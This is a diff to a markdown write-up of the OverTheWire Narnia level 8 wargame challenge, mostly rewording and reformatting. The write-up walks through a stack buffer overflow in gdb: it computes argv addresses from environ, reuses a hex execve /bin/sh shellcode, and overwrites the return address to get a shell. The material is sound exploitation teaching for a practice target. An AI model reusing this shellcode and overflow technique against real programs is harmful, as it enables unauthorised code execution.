@@ -102,7 +102,7 @@ x/40wx $sp
 * Blue - `$bp` register
 * Green - Return falue from the `func` to the `main`.
 
-Now, let's take a look at argv[0]:
+Now, let's take a look at argv[1]:
 
 ```
 x/s 0xffffd7b0
@@ -110,7 +110,7 @@ x/s 0xffffd7b0
 
 ![](4.png)
 
-Let's note where the argvs are actually located in memory:
+Let's note **where the argvs are actually** located in memory:
 
 ```
 x/5s 0xffffd7b0
@@ -118,7 +118,8 @@ x/5s 0xffffd7b0
 
 ![](5.png)
 
-looks familiar? This is because, in fact, the argvs go in right above the environment variables!
+looks familiar?<br />
+This is because, in fact, the argvs go in right above the environment variables!
 
 ```
 x/4s *((char **) environ)
@@ -128,15 +129,16 @@ x/4s *((char **) environ)
 
 **Conclusion:**<br />
 The formula for calculating the address of the variable argv[1] (if there is only one) is <br />
-**`&argv[1] = &environ[0] - len(argv[0]) - 1`** where the `-1` is to include the NULL at the end of the string.<br />
+**`argv[1] = environ - len(argv[1]) - 1`** where the `-1` is to include the NULL at the end of the string.<br />
 
-We need a part of the string (more precisely, the 20th to 24th bytes) to contain the address of the string itself. Otherwise in the stack, the 20th byte will overwrite the address of the string and the program will no longer refer to its place in memory to continue inserting values into the stack.<br />
+We need a part of the string (more precisely, index 20 to index 24) to contain the address of the string itself. Otherwise in the stack, the 20th byte will overwrite **the address** (of the string itself!) and the program will no longer refer to its place in memory to continue inserting values into the stack.<br />
 
-And so when we know the size of the string in `argv[1]`, we can easily calculate its position and insert it into the string itself.<br />
+And so when we know the size of the string `argv[1]`, we can easily calculate its position and insert it into the string itself.<br />
 
-Since we want the string to overwrite the address back, then the length of the string should be 32 bytes (20 + 4 + 4 + 4).<br />
+Since we want the string to overwrite the return-address-to-main, then the length of the string `argv[1]` should be 32 bytes (20 + 4 + 4 + 4).<br />
 
-So her address is: **`argv[1] = ((char **)enviorn) - 32 - 1 = 0xffffd7c4 - 33 = 0xffffd7a3`**
+So argv[1]'s address is:<br />
+**`argv[1] = ((char **)enviorn) - 32 - 1 = 0xffffd7c4 - 33 = 0xffffd7a3`**
 
 So the input string can be something like:
 ```
@@ -161,20 +163,21 @@ x/40wx $sp
 ![](8.png)
 
 
-Okay, so far so good. But - we'd like to replace "CCCC" with the address of... of what?
+Okay, so far so good.<br />
+But - we'd like to replace "CCCC" with the address of...<br />
+of what?
 
-Can we insert shellcode as argv[2] and use its address? We will take shellcode from previous challenges and try:
+Can we insert shellcode in `argv[2]` and use its address?<br />
+We will take a shellcode from previous challenges and try:
 
 * shellcode (level1->level2): `\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80`
 * argv[2] == shellcode, so len(argv[2]) == 33
 
-* &argv[1] == ((char **)environ) - ((len(argv[1]) + 1) + (len(argv[2]) + 1)) == ((char **)environ) - (33 + 34) == 0xffffd7c4 - 67 == 0xffffd781
+* argv[1] == ((char **)environ) - ((len(argv[1]) + 1) + (len(argv[2]) + 1)) == ((char **)environ) - (33 + 34) == 0xffffd7c4 - 67 == 0xffffd781
 
-* &argv[2] == ((char **)environ) - (len(argv[2]) + 1) == &argv[1] + (len(argv[1]) + 1) == 0xffffd781 + 33 == 0xffffd7a2
+* argv[2] == ((char **)environ) - (len(argv[2]) + 1) == argv[1] + (len(argv[1]) + 1) == 0xffffd781 + 33 == 0xffffd7a2
 
-So, let's try this:
-
-from the begining:
+So, let's try this from the begining:
 ```
 gdb ./narnia8
 ```
@@ -209,9 +212,9 @@ x/6s *((char **)environ) - 67
 
 ![](11.png)
 
-* `-67`: (len(argv[1]) + 1) + (len(argv[2]) + 1)
-* `0xffffd781`: &argv[1]
-* `0xffffd7a2`: &argv[2], the shellcode!
+* `67`: (len(argv[1]) + 1) + (len(argv[2]) + 1)
+* `0xffffd781`: argv[1]
+* `0xffffd7a2`: argv[2], the shellcode address!
 
 ```
 del 1
@@ -228,7 +231,7 @@ c
 It worked, we got a shell.<br />
 Now it remains to do the same thing outside of gdb.
 
-The problem is - we don't know the addresses now.<br />
+The problem is - **we don't know the addresses now**.<br />
 But, if we only manage to find out the address of `envinron`, we will win, because we can calculate the other addresses from it.
 
 
@@ -239,7 +242,10 @@ cd $(mktemp -d)
 vim getenv.c
 ```
 ```c
-/* /tmp/tmp.W5iNoFSMZz/getenv.c */
+ /********************************
+  * /tmp/tmp.W5iNoFSMZz/getenv.c *
+  ********************************/
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -275,7 +281,7 @@ gcc -m32 getenv.c -o getenv
 
 ![](13.png)
 
-And indeed, according to the formula (in this case of input: `subtracting 67` bytes from envinron for `argv[1]`, and `adding 33` to `argv[1]` to reach `argv[2]`) the correct addresses were indeed obtained:
+Indeed, according to the formula (in this case of input: `subtracting 67` bytes from `environ` to get `argv[1]`, and `adding 33` to `argv[1]` to reach `argv[2]`) the correct addresses were indeed obtained:
 
 ![](14.png)
 
@@ -283,8 +289,8 @@ And indeed, according to the formula (in this case of input: `subtracting 67` by
 * 0xffffd798 = 0xffffd7ba - 67 + 33
 
 By trial and error, it can be concluded that the position where the `environ` is set depends on the length of the name of the script.<br/>
-If the name increases by one character, 2 characters must be subtracted from the addresses.<br />
-If the name decreases by one character, 2 characters must be added to the addresses.
+* If the name increases by one character, 2 characters must be subtracted from the addresses.<br />
+* If the name decreases by one character, 2 characters must be added to the addresses.
 
 So,
 
